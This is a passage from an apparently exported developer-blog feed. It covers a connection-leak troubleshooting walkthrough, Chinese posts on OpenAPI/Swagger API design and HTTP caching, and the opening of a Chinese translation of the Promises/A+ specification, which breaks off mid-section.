function_">on</span>(<span class="string">&#x27;connected&#x27;</span>, <span class="function">(<span class="params">evt</span>) =&gt;</span> &#123;</span><br><span class="line">        info.<span class="property">connectionTimestamp</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">        <span class="title function_">logDebug</span>(<span class="string">`[<span class="subst">$&#123;label&#125;</span>] connected <span class="subst">$&#123;info.id&#125;</span> <span class="subst">$&#123;info.connectionTimestamp&#125;</span>`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    con.<span class="title function_">on</span>(<span class="string">&#x27;disconnected&#x27;</span>, <span class="function">(<span class="params">evt</span>) =&gt;</span> &#123;</span><br><span class="line">        connectionMap.<span class="title function_">delete</span>(evt.<span class="property">connection</span>);</span><br><span class="line">        <span class="built_in">clearInterval</span>(interval);</span><br><span class="line">    &#125;);</span><br><span class="line">    con.<span class="title function_">on</span>(<span class="string">&#x27;executed&#x27;</span>, <span class="function">(<span class="params">evt</span>) =&gt;</span> &#123;</span><br><span class="line">        info.<span class="property">lastUsedTimeStamp</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">    con.<span class="title function_">on</span>(<span class="string">&#x27;prepared&#x27;</span>, <span class="function">(<span class="params">evt</span>) =&gt;</span> &#123;</span><br><span class="line">        info.<span class="property">lastUsedTimeStamp</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Step-3-Reproduce-Problem"><a href="#Step-3-Reproduce-Problem" class="headerlink" title="Step 3: Reproduce Problem"></a>Step 3: Reproduce Problem</h2><p>Before we diagnose the issue, much better if we were able to replicate it consistently. Reproducing the problem allows us to work with a controlled environment. To be able to narrow down the scope of the investigation.</p>
<h2 id="Step-4-Investigate-Root-Cause"><a href="#Step-4-Investigate-Root-Cause" class="headerlink" title="Step 4: Investigate Root Cause"></a>Step 4: Investigate Root Cause</h2><p>Now that we’ve reproduced the problem, it’s time to analyze the data we’ve collected. Look for patterns, anomalies, and potential causes.</p>
<p>Identifying the root cause is often the most challenging part of troubleshooting. We could follow the pattern ISOLATE-INVESTIGATE-VALIDATE to find the root cause in the end.</p>
<p>In our scenario, we found there was an endpoint &#x2F;metrics timeout from the logs</p>
<p><img src="/images/2023-10/log1.png" alt="log1"></p>
<p>Then we confined the investigation scope to &#x2F;metrics endpoint turned out there were actually lots of history logs pointed to this endpoint.</p>
<p><img src="/images/2023-10/log2.png" alt="log2"></p>
<p>Dug into more logs of metric endpoint, we found the connection acquired by <code>retriveErrorLocalizedStrings</code> had never been released.</p>
<p><img src="/images/2023-10/log3.png" alt="log3"></p>
<p>Looking at the corresponding code, we noticed a new connection was acquired occasionally for a new task in <code>retriveErrorLocalizedStrings</code>, but never released.</p>
<h2 id="Step-5-Fix-Problem"><a href="#Step-5-Fix-Problem" class="headerlink" title="Step 5: Fix Problem"></a>Step 5: Fix Problem</h2><p>Once we’ve identified the root cause, it’s time to fix the problem. This might involve writing code to address the issue, reconfiguring system settings, or applying a patch.</p>
<h2 id="Step-6-Validate-Solution"><a href="#Step-6-Validate-Solution" class="headerlink" title="Step 6: Validate Solution"></a>Step 6: Validate Solution</h2><p>After implementing your fix, it’s essential to validate the solution. Test our application again to ensure the problem no longer occurs.</p>
<h2 id="Step-7-Recap-and-Protection"><a href="#Step-7-Recap-and-Protection" class="headerlink" title="Step 7: Recap and Protection"></a>Step 7: Recap and Protection</h2><p>Troubleshooting shouldn’t end with the issue resolution. Take the time to recap what you’ve learned from the experience. Document the problem, the root cause, and the solution we applied. Consider implementing protective measures to prevent similar issues in the future.<br>In this example, we</p>
<ul>
<li><p>Fixed the problem</p>
</li>
<li><p>Enhanced connection lifecycle management: executeWithNewConnection</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> executeWithNewConnection&lt;T&gt;(</span><br><span class="line">    <span class="attr">connection</span>: <span class="title class_">Connection</span>,</span><br><span class="line">    <span class="attr">task</span>: <span class="title class_">Task</span>&lt;T&gt;,</span><br><span class="line">    taskName?: string</span><br><span class="line">): <span class="title class_">Promise</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> localTaskName = <span class="title function_">getTaskName</span>(taskName)</span><br><span class="line">    <span class="keyword">const</span> newConnection = <span class="title function_">createNewConnection</span>(connection)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">run</span>(newConnection, task, localTaskName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> run&lt;T&gt;(<span class="attr">newConnection</span>: <span class="title class_">Connection</span>, <span class="attr">task</span>: <span class="title class_">Task</span>&lt;T&gt;, <span class="attr">taskName</span>: string): <span class="title class_">Promise</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">task</span>(newConnection)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="attr">err</span>: any) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> newConnection.<span class="title function_">finish</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Whenever the task is run either successfully or failed, we finish the new connection. This means the lifecycle of this newly created connection was totally controlled.</p>
</li>
</ul>
<h2 id="Step-8-Knowledge-Transfer"><a href="#Step-8-Knowledge-Transfer" class="headerlink" title="Step 8: Knowledge Transfer"></a>Step 8: Knowledge Transfer</h2><p>The final step is to transfer knowledge to our team and other relevant stakeholders. Share our experience and the steps we took to resolve the issue. This not only fosters a culture of continuous improvement but also empowers our team to handle similar problems in the future.</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Practice</tag>
        <tag>Troubleshooting</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 OpenAPI 设计 RESTful API (一)</title>
    <url>/experience/practice/restful-api-design-along-with-swagger/</url>
    <content><![CDATA[<h2 id="0x00-OpenAPI-简介"><a href="#0x00-OpenAPI-简介" class="headerlink" title="0x00. OpenAPI 简介"></a>0x00. OpenAPI 简介</h2><p>在之前的文章 <a href="https://0x400.com/experience/practice/dev-restful-api-design/">Restful API 设计指导</a> 中，我介绍了如何设计 Restful API。随着前后端的分离以及软件架构的复杂化，你是否也遇到过以下的一个或者多个问题呢？</p>
<ol>
<li>API 的设计和实现并非同一个人。无论是在大型互联网架构中还是复杂的软件开发中，API 的设计往往是有架构师、资深工程师、PM 等这些经验丰富的人负责。一旦设计完成，才将具体的开发任务分配给相应的 API 开发工程师。</li>
<li>API 有完整的测试。越是复杂的产品，对产品的质量有越高的要求，一般而言会有专门的测试团队对 API 进行完整的自动化测试。</li>
<li>前端开发工程师（或者 API 的调用方）和 API 工程师协同开发，因此前端工程师需要 Mock API 以解除对 API 开发进度的依赖。</li>
</ol>
<span id="more"></span>
<p>为了解决以上问题中，至少需要保证两点：</p>
<ol>
<li>API 的设计优先。</li>
<li>API 的设计结果需要在架构师、 API 开发工程师、测试工程师和前端工程师中清晰准确的传递。</li>
</ol>
<p>OpenAPI 规范通过定义一种 API 规范旨在解决 API 的设计、开发、消费之间的信息传递问题。</p>
<blockquote>
<p>The <strong>OpenAPI Specification</strong>, originally known as the <strong>Swagger Specification</strong>, is a <a href="https://en.wikipedia.org/wiki/Specification_(technical_standard)">specification</a> for <a href="https://en.wikipedia.org/wiki/Machine-readable_medium">machine-readable</a> <a href="https://en.wikipedia.org/wiki/Interface_(computing)">interface</a> files for describing, producing, consuming, and visualizing <a href="https://en.wikipedia.org/wiki/Representational_state_transfer">RESTful</a> <a href="https://en.wikipedia.org/wiki/Web_API">web services</a>.[<a href="https://en.wikipedia.org/wiki/OpenAPI_Specification#cite_note-1">1]</a> Originally part of the <a href="https://en.wikipedia.org/wiki/Swagger_(software)">Swagger</a> framework, it became a separate project in 2016, overseen by the OpenAPI Initiative, an open-source collaboration project of the <a href="https://en.wikipedia.org/wiki/Linux_Foundation">Linux Foundation</a>.[<a href="https://en.wikipedia.org/wiki/OpenAPI_Specification#cite_note-charter-2">2]</a> Swagger and some other tools can generate code, documentation and test cases given an interface file.</p>
<p>– from Wikipedia</p>
</blockquote>
<p>OpenAPI 规范截止目前共发布了 3 个大版本，目前主要使用的分别是 OpenAPI 3 和 Swagger 2，他们之间跟属性的差别如下：</p>
<p><img src="/images/2021-01/spec2-vs-spec3.png"></p>
<p>API 的定义支持 YAML 格式和 JSON 格式。以官方提供的基于 Swagger 2.0 的 <a href="https://petstore.swagger.io/v2/swagger.json">Petstore</a> API 设计方案为例，</p>
<p><img src="/images/2021-01/spec-v2.png"></p>
<p>Swagger 2.0 版本常用的根属性（Fixed Field）有：</p>
<table>
<thead>
<tr>
<th>属性名</th>
<th>取值类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>swagger</td>
<td><code>string</code></td>
<td>定义 OpenAPI 规范的版本号， v2 版本取值必须是<code>&quot;2.0&quot;</code>.</td>
</tr>
<tr>
<td>info</td>
<td><a href="https://github.com/OAI/OpenAPI-Specification/blob/main/versions/2.0.md#infoObject">Info Object</a></td>
<td>API 的元数据信息。包括开发者信息，API 的概述，API 版本和版权等信息。</td>
</tr>
<tr>
<td>host</td>
<td><code>string</code></td>
<td>定义 API 的访问域名。</td>
</tr>
<tr>
<td>basePath</td>
<td><code>string</code></td>
<td>访问 API 时将此值做为 API 的前缀路径。</td>
</tr>
<tr>
<td>schemes</td>
<td>[<code>string</code>]</td>
<td>API 支持的通信协议， 包括 <code>&quot;http&quot;</code>, <code>&quot;https&quot;</code>, <code>&quot;ws&quot;</code>, <code>&quot;wss&quot;</code>  等一种或多种。</td>
</tr>
<tr>
<td>paths</td>
<td>Paths Object</td>
<td>每个 API 的具体定义。 定义中包括 API 的端点（endpoint），参数类型，返回值类型。每个 API 端点的定义中，又以 API 的调用方法分组。</td>
</tr>
<tr>
<td>definitions</td>
<td><a href="https://github.com/OAI/OpenAPI-Specification/blob/main/versions/2.0.md#definitionsObject">Definitions Object</a></td>
<td>定义一个数据结构，一般将公用的数据模型定义在此处以供 API 的定义直接引用。</td>
</tr>
</tbody></table>
<p>更多属性及其定义可以查看官方文档 <a href="https://github.com/OAI/OpenAPI-Specification/blob/main/versions/2.0.md">OpenAPI V2.0</a>。</p>
<h2 id="0x01-Swagger"><a href="#0x01-Swagger" class="headerlink" title="0x01. Swagger"></a>0x01. Swagger</h2><p>Swagger 是 OpenAPI 的实现，它提供了 API 设计、API 测试、可视化 API 的定义和 Mock API 数据等诸多功能。</p>
<p><img src="/images/2021-01/swagger-intro.png"></p>
<p>Swagger 提供了一些开源组件，这些组件都是开源的。Swagger 官方把他们被集成到了 <a href="https://app.swaggerhub.com/">Swagger Hub</a> 中供我们直接在线上使用，当然我们也可以单独将这些组件部署在我们的开发环境中：</p>
<p><img src="/images/2021-01/swagger-tools.png"></p>
<ol>
<li><p><strong>Swagger Codegen</strong></p>
<p>Swagger Codegen 可以将 API 的 OpenAPI 定义翻译成各种格式的接口文档，也可以生成各种编程语言的 SDK 代码。</p>
<blockquote>
<p>Swagger Codegen can simplify your build process by generating server stubs and client SDKs for any API, defined with the OpenAPI (formerly known as Swagger) specification, so your team can focus better on your API’s implementation and adoption.</p>
</blockquote>
</li>
<li><p><strong><a href="https://editor.swagger.io/">Swagger Editor</a></strong></p>
<p>Swagger Editor 提供在线编辑，设计 API 的功能。</p>
<blockquote>
<p>Design, describe, and document your API on the first open source editor fully dedicated to OpenAPI-based APIs. The Swagger Editor is an easy way to get started with the OpenAPI Specification (formerly known as Swagger), with support for Swagger 2.0 and OpenAPI 3.0.</p>
</blockquote>
</li>
<li><p><strong><a href="https://petstore.swagger.io/">Swagger UI</a></strong></p>
<p>Swagger UI 将 API 的设计可视化，让 API 的消费者更加容易阅读 API 的定义和使用 API。</p>
<blockquote>
<p>Swagger UI allows anyone — be it your development team or your end consumers — to visualize and interact with the API’s resources without having any of the implementation logic in place. It’s automatically generated from your OpenAPI (formerly known as Swagger) Specification, with the visual documentation making it easy for back end implementation and client side consumption.</p>
</blockquote>
</li>
</ol>
<h2 id="0x02-使用-Swagger-设计-API"><a href="#0x02-使用-Swagger-设计-API" class="headerlink" title="0x02. 使用 Swagger 设计 API"></a>0x02. 使用 Swagger 设计 API</h2><h3 id="2-0-初识-Swagger-Editor"><a href="#2-0-初识-Swagger-Editor" class="headerlink" title="2.0 初识 Swagger Editor"></a>2.0 初识 Swagger Editor</h3><p>使用 Swagger 设计 API，首先要打开  <a href="https://app.swaggerhub.com/">Swagger Hub</a> 或者 <a href="https://editor.swagger.io/">Swagger Editor</a>。打开 Swagger Editor 后，默认会载入 Petstore 的 API 定义，</p>
<p><img src="/images/2021-01/swagger-editor.png"></p>
<p>其中 Swagger Editor 集成了 Swagger UI，如右侧所示。左侧的区域 1 为 API 定义代码编辑器，右侧区域 2 为 API 的描述信息展示区，右侧区域 3 为 API 的定义可视化区，右侧区域 4 则为 API 引用的数据模型定义的可视化区。</p>
<p>在区域 2 中点击具体的某个 API，以 <code>POST /user</code> 为例，可以看到更多的 API 定义信息,</p>
<p><img src="/images/2021-01/post-user.png"></p>
<h3 id="2-1-设计-GET-user-接口"><a href="#2-1-设计-GET-user-接口" class="headerlink" title="2.1 设计 GET &#x2F;user 接口"></a>2.1 设计 GET &#x2F;user 接口</h3><p>设计一个 <code>GET /user</code> 的接口用于返回用户列表，在 <code>/user</code> 下添加 get 方法，并有如下定义：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">/user:</span></span><br><span class="line">  <span class="attr">get:</span></span><br><span class="line">    <span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;user&quot;</span></span><br><span class="line">    <span class="attr">summary:</span> <span class="string">&quot;Get users with filltering&quot;</span></span><br><span class="line">    <span class="attr">operationId:</span> <span class="string">&quot;getUser&quot;</span></span><br><span class="line">    <span class="attr">consumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    <span class="attr">produces:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    <span class="attr">responses:</span></span><br><span class="line">      <span class="attr">200:</span></span><br><span class="line">        <span class="attr">description:</span> <span class="string">&quot;successful operation&quot;</span></span><br><span class="line">        <span class="attr">schema:</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">&quot;array&quot;</span></span><br><span class="line">          <span class="attr">items:</span></span><br><span class="line">            <span class="string">$ref:</span> <span class="string">&quot;#/definitions/User&quot;</span></span><br><span class="line">      <span class="attr">400:</span></span><br><span class="line">        <span class="attr">description:</span> <span class="string">&quot;Invalid query parameters&quot;</span></span><br></pre></td></tr></table></figure>

<p>可视化的 <code>GET /user</code> 接口如下：</p>
<p><img src="/images/2021-01/get-user.png"></p>
<h3 id="2-3-添加过滤参数"><a href="#2-3-添加过滤参数" class="headerlink" title="2.3 添加过滤参数"></a>2.3 添加过滤参数</h3><p>为了让 <code>GET /user</code> 接口支持分页查询，我们需要定义两个过滤参数 skip 和 limit。这两个参数是携带在请求的 URL 中的，因此我们需要为 GET 请求添加如下的查询参数定义：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">parameters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">in:</span> <span class="string">&quot;query&quot;</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">&quot;skip&quot;</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">&quot;integer&quot;</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">&quot;Skip number of users&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">in:</span> <span class="string">&quot;query&quot;</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">&quot;limit&quot;</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">&quot;integer&quot;</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">&quot;Limit number of users&quot;</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>in: &quot;query&quot;</code> 表示该参数位于请求的 URL 中，除此之外，参数还可以携带在请求的头部或者实体中，分别取值 <code>in: &quot;header&quot;</code> 和 <code>in: &quot;body&quot; </code>。</p>
<p>至此，我们就完成了一个 API 的设计。我们只需要将 API 的设计描述文件发送给各个角色的人员，大家行可以围绕着下如下开发流程进行并行开发。</p>
<p><img src="/images/2021-01/API-dev-process.png"></p>
<p>综上所述，本文主要介绍了基于 OpenAPI 协议和 Swagger 工具的 API 设计和开发。后续将以 NodeJS 为例，介绍 Swagger 如何集成到 API 的开发环境中，以及它是如何为 API 开发保驾护航的，敬请期待。</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>Swagger</tag>
        <tag>OpenAPI</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP 缓存不完全指南</title>
    <url>/fundamental/network/http/dev-http-caching/</url>
    <content><![CDATA[<blockquote>
<p><em>Cache</em> is a hardware or software component that stores data so that future requests for that data can be served faster.</p>
</blockquote>
<p>按照维基百科的定义，缓存是一种用来存储数据的硬件或者软件，它使得后续的信息传输更快。</p>
<span id="more"></span>




<h2 id="从一张图片的加载说起"><a href="#从一张图片的加载说起" class="headerlink" title="从一张图片的加载说起"></a>从一张图片的加载说起</h2><p><img src="/images/2020-05/dog.jpg"></p>
<p>这是这一张图片的响应头头部，其中包含 <code>last-modified</code> 字段。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">content-length</span><span class="punctuation">: </span>39409</span><br><span class="line"><span class="attribute">last-modified</span><span class="punctuation">: </span>Thu, 14 May 2020 14:29:20 GMT</span><br><span class="line"><span class="attribute">x-response-time</span><span class="punctuation">: </span>7ms</span><br></pre></td></tr></table></figure>

<p>那么就让我们从这两个问题开始：</p>
<ul>
<li>当我们刷新浏览器的时候，图片如何加载？是否会使用缓存？</li>
<li>如果我们添加一个 <code>cache-control: no-cache</code> 的响应头部，再次刷新图片又该如何加载？</li>
</ul>
<h2 id="为什么我们要使用缓存"><a href="#为什么我们要使用缓存" class="headerlink" title="为什么我们要使用缓存"></a>为什么我们要使用缓存</h2><ul>
<li>减少冗余数据传输</li>
<li>节省带宽</li>
<li>避免瞬间拥塞<br>如明星出轨的新闻会使微博奔溃一样，其背后的原因就是瞬间有大量的用户共同访问同一个资源，这就使得网络瞬间拥塞（Flash Crowds）。使用缓存可以分散用户流量，避免瞬间拥塞。</li>
<li>距离时延<br>信息以光速在互联网中传输，但是如果客户端访问的资源较远，客户端的请求仍然需要耗费几百毫秒甚至几秒的时间才能抵达服务器，服务器的响应也需要经过近似长的时间才能抵达客户端。如果能命中客户端的缓存或者离客户端较近的缓存，那么就可以缩短距离时延。</li>
</ul>
<h2 id="HTTP-缓存的三种状态"><a href="#HTTP-缓存的三种状态" class="headerlink" title="HTTP 缓存的三种状态"></a>HTTP 缓存的三种状态</h2><p>一般而言，缓存只有两种状态，即存活和过期，一旦缓存过期，会有定时器将其清除。和其他缓存软件不一样的是，HTTP 缓存中定义了三种缓存状态:<br><img src="/images/2020-05/cache-steps.png"></p>
<ol>
<li>缓存命中</li>
<li>缓存未命中</li>
<li>缓存再验证中</li>
</ol>
<p>缓存的第一二种状态和常规缓存软件一样，不同的是第三种状态 - 缓存再验证。**和其他缓存软件不一样的是，HTTP 缓存过期后并不会立即被删除，所以当新的请求命中了过期后的缓存时，会携带 <code>if-none-match</code> 和 <code>last-modified</code> 头部请求服务器对资源做再验证。 **</p>
<p>再验证的目的是判断过期后的缓存是否可用。如果在这段时间内资源并未发生变化，那么即使资源是过期的，但依然与最新的资源内容一致，**然后服务端会使用 304 状态码告诉客户端可使用缓存，**再验证通过。如果资源发生了改变，那么服务端会返回最新的资源，并覆盖掉缓存，再验证失败。</p>
<h2 id="HTTP-缓存的处理流程"><a href="#HTTP-缓存的处理流程" class="headerlink" title="HTTP 缓存的处理流程"></a>HTTP 缓存的处理流程</h2><p>如之前所述，HTTP 缓存的处理流程如下：</p>
<p><img src="/images/2020-05/cache-flow.png" alt="cache flow"></p>
<h2 id="HTTP-缓存机制"><a href="#HTTP-缓存机制" class="headerlink" title="HTTP 缓存机制"></a>HTTP 缓存机制</h2><p><img src="/images/2020-05/cache-mechanism.png" alt="mechanism"></p>
<p>HTTP 缓存具有三个状态，与之对应也有三个策略，即<strong>存储策略、过期策略和再验证策略。</strong> 客户端和服务端使用响应的头部控制这些策略。</p>
<h3 id="存储策略"><a href="#存储策略" class="headerlink" title="存储策略"></a>存储策略</h3><p>服务端下发的<strong>响应头部</strong>中包含了一个请求头 <code>Cache-Control</code>，其部分取值即用于控制客户端的缓存行为（并非客只有客户端实现了HTTP 缓存协议，如 CDN 一样的中间代理也会实现 HTTP 缓存）。<code>Cache-Control</code> 用于控制存储策略的部分取值如下：</p>
<ul>
<li><code>private</code>   - 私有缓存，数据只能存储在客户端，缓存不可共享。</li>
<li><code>public</code>     - 共有缓存，数据可以存储在任何地方，如 CDN 等，缓存可共享。</li>
<li><code>no-store</code> - 数据不能被存储，无论是私有还是共有，如果有缓存，缓存客户端应该尽快删除。</li>
</ul>
<h3 id="过期策略"><a href="#过期策略" class="headerlink" title="过期策略"></a>过期策略</h3><p><code>Cache-Control</code>可以有多个取值，多个值之间使用都好分割。除了控制存储策略的取值外，还包含控制过期策略的取值：</p>
<ul>
<li><code>max-age=x</code>  - 设置缓存的生存时间是 x 秒，x 秒能命中缓存可以直接使用， x 秒后如果仍然命中缓存那么会对缓存做再验证，如果验证通过则使用。</li>
<li><code>no-cache</code>    - 相当于 <code>max-age=0</code>，<strong>其含义是说数据可以被存储，但是再验证之前不能直接使用</strong>。</li>
</ul>
<p>除了 <code>Cache-Control</code> 外，早期 HTTP&#x2F;1.0 版本是使用 <code>expires</code> 头部控制过期策略的，<code>max-age</code> 是 HTTP&#x2F;1.1 版本引入的，如果 <code>Cache-Control: max-age=x</code> 和 <code>Expires: xx</code> 都设置了，<strong>会优先使用 max-age 控制过期策略。</strong></p>
<h3 id="再验证策略"><a href="#再验证策略" class="headerlink" title="再验证策略"></a>再验证策略</h3><p>再验证策略需要客户端和服务端的共同配合，因此共有四个相关的首部，总结如下</p>
<table>
<thead>
<tr>
<th>名字</th>
<th>版本</th>
<th>作用头部</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Etag</td>
<td>HTTP&#x2F;1.1</td>
<td>响应头</td>
<td>响应体的唯一性哈希值</td>
</tr>
<tr>
<td>Last-Modified</td>
<td>HTTP&#x2F;1.0</td>
<td>响应头</td>
<td>响应体（资源）最后修改时间</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>HTTP&#x2F;1.1</td>
<td>请求头</td>
<td>使用该请求头携带上次服务端下方的 etag</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>HTTP&#x2F;1.0</td>
<td>请求头</td>
<td>该请求发出的时间，用于判断资源在该时间之前是否改变</td>
</tr>
</tbody></table>
<p>此前，我们所探讨的 <code>Cache-Control</code> 是作用在响应头部的，值得注意的是，该头部也可以作用在请求头部。<strong><code>Cache-Control</code> 作用在请求头部最常用的取值是 <code>no-cache</code> ，表示当前请求不能使用任何缓存，一般用于支持端到端的强制刷新。</strong> 当我们禁用缓存刷新页面时，浏览器就会携带该请求头。<br><img src="/images/2020-05/reload-example.png"></p>
<h2 id="试探性过期策略"><a href="#试探性过期策略" class="headerlink" title="试探性过期策略"></a>试探性过期策略</h2><p>如果存储策略、过期策略和再验证策略都缺失，那么就无法使用任何 HTTP 缓存，也就是说系统没有实现 HTTP 缓存协议。</p>
<p>一般而言，服务器都会为静态资源生成 <code>Last-Modified</code> 头部，即再验证策略可用。这种情况下<strong>如果服务端没有指定存储策略也没有指定过期策略，那么缓存客户端会使用试探性过期策略算法推算出资源过期时间</strong>。试探性过期策略算法如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">TimeSinceModify</span> = <span class="title function_">max</span>(<span class="number">0</span>, <span class="title class_">Current</span> - <span class="title class_">LastModified</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MaxAge</span> = <span class="title function_">int</span>(<span class="title class_">TimeSinceModify</span> * <span class="title class_">LMFactor</span>);</span><br></pre></td></tr></table></figure>

<p>其中 LMFactor 取值如下：</p>
<p><img src="/images/2020-05/cache-henuristic-expiration.png"></p>
<p>现在， 让我们回顾文章开头的两个问题</p>
<ul>
<li>当我们刷新浏览器的时候，图片如何加载？是否会使用缓存？<br>我们知道，响应头中只包括再验证策略 - <code>Last-Modified</code> 头部，因此客户端会缓存图片并且使用试探性过期策略推导出缓存时间。因此，再次刷新图片时理论上会命中客户端缓存。</li>
<li>如果我们在响应头部中添加一个 <code>cache-control: no-cache</code> 的响应头部，那多次刷新图片又该如何加载？<br>设置 <code>no-cache</code> 后，即添加了过期策略， <code>no-cache</code> 表示不会再验证之前不会使用缓存，因此理论上再次刷新服务端会返回 304 并从客户端缓存中读取图片。</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><strong>Useful links &amp;&amp; reference</strong></p>
<ul>
<li><a href="https://tools.ietf.org/html/rfc2616#section-14.9">https://tools.ietf.org/html/rfc2616#section-14.9</a></li>
<li><a href="https://tools.ietf.org/html/rfc7234">https://tools.ietf.org/html/rfc7234</a></li>
<li><a href="https://www.amazon.com/HTTP-Definitive-Guide-Guides/dp/1565925092">HTTP Definitive Guide</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control</a></li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Network</category>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>Caching</tag>
      </tags>
  </entry>
  <entry>
    <title>Promises/A+ 标准翻译</title>
    <url>/fundamental/programming-language/javascript/dev-translate-promise-a-plus-specification/</url>
    <content><![CDATA[<p><strong>一个健全的、可互操作的 JavaScript Promise 标准  —— 由开发者而定，为开发者而生。</strong></p>
<p><em>promise</em>代表异步操作的最终结果。Promise 开放的最原始接口是 <code>then</code> 方法，由该方法注册的回调函数来接受 Promise 成功状态（fulfilled）下返回的值或失败状态（rejected）下返回的错误信息。</p>
<p>本规范详细定义了 <code>then</code> 方法的行为，提供了 Promise 可互操作的基础，所有 Promises&#x2F;A+ 兼容的 Promise 实现都可以参考该规范。因此，该规范是非常稳定的。 尽管 Promises&#x2F;A+ 组织有时会为了向后兼容而对此规范做小的改动，但只有经过深思熟虑，充分讨论和测试之后，我们才会集成有较大改动的或向后兼容的版本更改。</p>
<span id="more"></span>

<p>Promises&#x2F;A+ 阐明了早期 <a href="http://wiki.commonjs.org/wiki/Promises/A">Promises&#x2F;A 草案</a> 的行为条款，在此基础上扩展其涵盖 <em>de facto</em> 的所有行为，并且省略了未指定或有问题的部分。</p>
<p>最后，Promises&#x2F;A+ 规范的核心不涉及如何创建，完成或拒绝 Promise，而是专注于提供不同实现的 Promise 可互操作的 <code>then</code> 方法。 当然，不排除未来的规范会涉及这些主题。</p>
<h2 id="1-术语"><a href="#1-术语" class="headerlink" title="1. 术语"></a>1. 术语</h2><ol>
<li>“promise” 是一个有 <code>then</code> 方法的对象或者函数，<code>then</code> 方法的所有行为都符合本规范。</li>
<li>“thenable” 是一个定义了 <code>then</code> 方法的对象或者函数。</li>
<li>“value” 是 JavaScript 任意数据类型的值（包括 <code>undefined</code> 、 <code>thenable</code> 或者 <code>promise</code>）</li>
<li>“exception” 是由 <code>throw</code>  抛出的异常。</li>
<li>“reason”  表示 Promise 失败的原因。</li>
</ol>
<h2 id="2-标准"><a href="#2-标准" class="headerlink" title="2. 标准"></a>2. 标准</h2><h3 id="2-1-Promise-的状态"><a href="#2-1-Promise-的状态" class="headerlink" title="2.1 Promise 的状态"></a>2.1 Promise 的状态</h3><p>一个 Promise 的状态必须是 pending、 fulfilled 或者 rejected。</p>
<ul>
<li>2.1.1 当 Promise 处于  pending 状态：<ul>
<li>2.1.1.1 Promise 可能会转变成 fulfilled 或者 rejected 中的一种。</li>
</ul>
</li>
<li>2.1.2 当 Promise 处于 fulfilled 状态：<ul>
<li>2.1.2.1 Promise 状态必须保持不变。</li>
<li>2.1.2.1 Promise 必须有一个 value，并且它的值不会改变。</li>
</ul>
</li>
<li>2.1.3 当 Promise 处于 rejected 状态：<ul>
<li>2.1.3.1 Promise 状态必须保持不变。</li>
<li>2.1.3.2 Promise 必须有一个 reason，并且它的值不会改变。</li>
</ul>
</li>
</ul>
<p>这里的不会改变指的是恒定不变(<code>===</code>)，但不意味着深拷贝不变（这句话我暂时还没理解，附上原文如下）。</p>
<p>Here, “must not change” means immutable identity (i.e. <code>===</code>), but does not imply deep immutability.</p>
<h3 id="2-2-then-方法"><a href="#2-2-then-方法" class="headerlink" title="2.2 then 方法"></a>2.2 <code>then</code> 方法</h3><p>Promise 必须提供一个 <code>then</code> 方法用于获取 Promise 当前或最终的 value 或 reason。</p>
<p><code>then</code> 方法接收两个参数：</p>
